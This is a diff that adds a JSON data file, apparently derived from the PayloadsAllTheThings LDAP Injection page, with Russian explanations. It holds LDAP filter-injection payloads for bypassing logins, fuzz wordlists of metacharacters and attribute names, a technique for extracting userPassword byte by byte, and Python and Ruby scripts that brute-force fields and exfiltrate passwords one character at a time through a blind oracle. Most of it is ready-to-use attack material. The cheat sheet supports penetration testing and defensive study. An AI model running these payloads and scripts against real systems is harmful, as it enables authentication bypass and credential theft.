@@ -1,0 +1,135 @@
+{
+  "category": "LDAP Injection",
+  "source": "PayloadsAllTheThings/LDAP Injection/",
+  "entries": [
+    {
+      "subcategory": "Методология",
+      "title": "Что такое LDAP-инъекция и где искать",
+      "language": "text",
+      "tags": ["methodology", "ldap", "recon"],
+      "body": "LDAP-инъекция возникает, когда пользовательский ввод подставляется в LDAP-фильтр без экранирования. Атакующий через локальный прокси меняет логику фильтра, добавляя свои условия.\n\nГде искать:\n• Формы логина (login / username + password) — типовая цель обхода аутентификации.\n• Поисковые поля по каталогу (search, dir, cn, mail).\n• Любой ввод, который попадает в запрос вида (&(uid=ВВОД)(...)).\n\nИдея эксплуатации: сначала подставь спецсимволы * ( ) | & и сломай фильтр, затем дотюнь условия так, чтобы получить always-true или вытащить атрибуты по одному символу (blind)."
+    },
+    {
+      "subcategory": "Методология",
+      "title": "Спецсимволы LDAP-фильтра (RFC 4515)",
+      "language": "table",
+      "tags": ["ldap", "syntax", "reference"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Символ", "Назначение в фильтре"],
+          "rows": [
+            ["&", "логическое AND — все вложенные условия должны быть истинны"],
+            ["|", "логическое OR — достаточно одного истинного условия"],
+            ["!", "логическое NOT — отрицание условия"],
+            ["=", "равенство атрибута значению"],
+            ["*", "wildcard — любая последовательность символов (в т.ч. проверка «атрибут существует»)"],
+            ["(", "открытие подвыражения / условия"],
+            [")", "закрытие подвыражения / условия"],
+            ["\\xx", "экранированный байт (hex), нужен для OCTET STRING и спецсимволов"],
+            ["%00", "NULL-байт — отсекает «хвост» исходного фильтра"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "Обход аутентификации",
+      "title": "Always-true через (uid=*) — пример 1",
+      "language": "text",
+      "tags": ["auth-bypass", "wildcard"],
+      "body": "user  = *)(uid=*))(|(uid=*\npass  = password\nquery = (&(uid=*)(uid=*))(|(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==))"
+    },
+    {
+      "subcategory": "Обход аутентификации",
+      "title": "Обход через отрицание (!(&(1=0 — пример 2",
+      "language": "text",
+      "tags": ["auth-bypass", "filter-injection"],
+      "body": "user  = admin)(!(&(1=0\npass  = q))\nquery = (&(uid=admin)(!(&(1=0)(userPassword=q))))"
+    },
+    {
+      "subcategory": "Обход аутентификации",
+      "title": "Готовые wildcard-полезные нагрузки в поле логина",
+      "language": "text",
+      "tags": ["auth-bypass", "wildcard", "fuzz"],
+      "body": "*\n*)(uid=*))(|(uid=*\nadmin*\nadmin*)((|userPassword=*)\nadmin*)((|userpassword=*)\n*(|(mail=*))\n*(|(objectclass=*))"
+    },
+    {
+      "subcategory": "Инъекция в фильтр",
+      "title": "Внедрение дополнительного атрибута: *)(ATTR=*",
+      "language": "text",
+      "tags": ["filter-injection", "wildcard"],
+      "body": "Шаблон инъекции для дописывания условия в фильтр:\n\n*)(ATTRIBUTE_HERE=*\n\nВместо ATTRIBUTE_HERE подставляй атрибуты каталога (см. список ниже). Так можно проверять существование атрибутов и менять логику исходного (&(login=...)(password=...))."
+    },
+    {
+      "subcategory": "Инъекция в фильтр",
+      "title": "Стандартные атрибуты LDAP для инъекции",
+      "language": "text",
+      "tags": ["filter-injection", "attributes", "reference"],
+      "body": "userPassword\nsurname\nname\ncn\nsn\nobjectClass\nmail\ngivenName\ncommonName"
+    },
+    {
+      "subcategory": "Инъекция в фильтр",
+      "title": "Расширенный словарь имён атрибутов (для брутфорса полей)",
+      "language": "text",
+      "tags": ["filter-injection", "attributes", "wordlist"],
+      "body": "c\ncn\nco\ncommonName\ndc\nfacsimileTelephoneNumber\ngivenName\ngn\nhomePhone\nid\njpegPhoto\nl\nmail\nmobile\nname\no\nobjectClass\nou\nowner\npager\npassword\nsn\nst\nsurname\nuid\nusername\nuserPassword"
+    },
+    {
+      "subcategory": "Спецсимволы и wildcards",
+      "title": "Fuzz-словарь LDAP-метасимволов (raw + URL-encoded)",
+      "language": "text",
+      "tags": ["fuzz", "wildcard", "wordlist"],
+      "body": "*\n*)(&\n*))%00\n)(cn=))\\x00\n*()|%26'\n*()|&'\n*(|(mail=*))\n*(|(objectclass=*))\n*)(uid=*))(|(uid=*\n*/*\n*|\n/\n//\n//*\n@*\n|\n&\n(\n)\n!\nadmin*\nadmin*)((|userpassword=*)\nadmin*)((|userPassword=*)\nx' or name()='username' or 'x'='y\n%21\n%26\n%28\n%29\n%2A%28%7C%28mail%3D%2A%29%29\n%2A%28%7C%28objectclass%3D%2A%29%29\n%2A%7C\n%7C"
+    },
+    {
+      "subcategory": "Спецсимволы и wildcards",
+      "title": "Атрибут userPassword — это OCTET STRING, а не строка",
+      "language": "text",
+      "tags": ["userpassword", "octet-string", "advanced"],
+      "body": "userPassword — не строка (как cn), а OCTET STRING. В LDAP каждый объект/тип/оператор адресуется через OID. Для побитового сравнения используется matching rule octetStringOrderingMatch (OID 2.5.13.18): сравнивает два octet string бит-за-битом (big endian), пока не найдёт различие; значение с нулевым битом считается меньше значения с единичным битом.\n\nЭто позволяет блайнд-перебирать пароль по байтам через extensible match."
+    },
+    {
+      "subcategory": "Спецсимволы и wildcards",
+      "title": "Перебор userPassword по байтам через OID 2.5.13.18",
+      "language": "text",
+      "tags": ["userpassword", "octet-string", "extraction"],
+      "body": "userPassword:2.5.13.18:=\\xx (\\xx is a byte)\nuserPassword:2.5.13.18:=\\xx\\xx\nuserPassword:2.5.13.18:=\\xx\\xx\\xx"
+    },
+    {
+      "subcategory": "Blind boolean экстракция",
+      "title": "Посимвольный перебор пароля через wildcard",
+      "language": "text",
+      "tags": ["blind", "boolean", "extraction"],
+      "body": "Фильтр по-разному отвечает на совпадение/несовпадение префикса — это и есть оракул. Перебираем символы как в бинарном поиске:\n\n(&(sn=administrator)(password=*))    : OK\n(&(sn=administrator)(password=A*))   : KO\n(&(sn=administrator)(password=B*))   : KO\n...\n(&(sn=administrator)(password=M*))   : OK\n(&(sn=administrator)(password=MA*))  : KO\n(&(sn=administrator)(password=MB*))  : KO\n...\n(&(sn=administrator)(password=MY*))  : OK\n(&(sn=administrator)(password=MYA*)) : KO\n(&(sn=administrator)(password=MYB*)) : KO\n(&(sn=administrator)(password=MYC*)) : KO\n...\n(&(sn=administrator)(password=MYK*)) : OK\n(&(sn=administrator)(password=MYKE)) : OK"
+    },
+    {
+      "subcategory": "Blind boolean экстракция",
+      "title": "Разбор blind-фильтра",
+      "language": "text",
+      "tags": ["blind", "boolean", "reference"],
+      "body": "• &                  логический AND — все условия внутри должны быть истинны.\n• (sn=administrator)  совпадает с записями, где атрибут sn (фамилия) = administrator.\n• (password=X*)       совпадает, если password начинается с X (регистрозависимо). * — wildcard на любой остаток.\n\nИтерируя X от A до Z, затем добавляя следующий символ, по реакции OK/KO достраиваешь значение целиком."
+    },
+    {
+      "subcategory": "Слепая эксфильтрация",
+      "title": "Поиск валидных LDAP-полей (Python)",
+      "language": "python",
+      "tags": ["blind", "field-discovery", "script"],
+      "body": "#!/usr/bin/python3\nimport requests\nimport string\n\nfields = []\nurl = 'https://URL.com/'\nf = open('dic', 'r')\nworld = f.read().split('\\n')\nf.close()\n\nfor i in world:\n    r = requests.post(url, data = {'login':'*)('+str(i)+'=*))\\x00', 'password':'bla'}) #Like (&(login=*)(ITER_VAL=*))\\x00)(password=bla))\n    if 'TRUE CONDITION' in r.text:\n        fields.append(str(i))\n\nprint(fields)"
+    },
+    {
+      "subcategory": "Слепая эксфильтрация",
+      "title": "Blind-эксфильтрация значения по символам (Python)",
+      "language": "python",
+      "tags": ["blind", "extraction", "script"],
+      "body": "#!/usr/bin/python3\nimport requests, string\nalphabet = string.ascii_letters + string.digits + \"_@{}-/()!\\\"$%=^[]:;\"\n\nflag = \"\"\nfor i in range(50):\n    print(\"[i] Looking for number \" + str(i))\n    for char in alphabet:\n        r = requests.get(\"http://ctf.web?action=dir&search=admin*)(password=\" + flag + char)\n        if (\"TRUE CONDITION\" in r.text):\n            flag += char\n            print(\"[+] Flag: \" + flag)\n            break"
+    },
+    {
+      "subcategory": "Слепая эксфильтрация",
+      "title": "Blind-эксфильтрация значения по символам (Ruby, @noraj)",
+      "language": "ruby",
+      "tags": ["blind", "extraction", "script"],
+      "body": "#!/usr/bin/env ruby\nrequire 'net/http'\nalphabet = [*'a'..'z', *'A'..'Z', *'0'..'9'] + '_@{}-/()!\"$%=^[]:;'.split('')\n\nflag = ''\n(0..50).each do |i|\n  puts(\"[i] Looking for number #{i}\")\n  alphabet.each do |char|\n    r = Net::HTTP.get(URI(\"http://ctf.web?action=dir&search=admin*)(password=#{flag}#{char}\"))\n    if /TRUE CONDITION/.match?(r)\n      flag += char\n      puts(\"[+] Flag: #{flag}\")\n      break\n    end\n  end\nend"
+    }
+  ]
+}
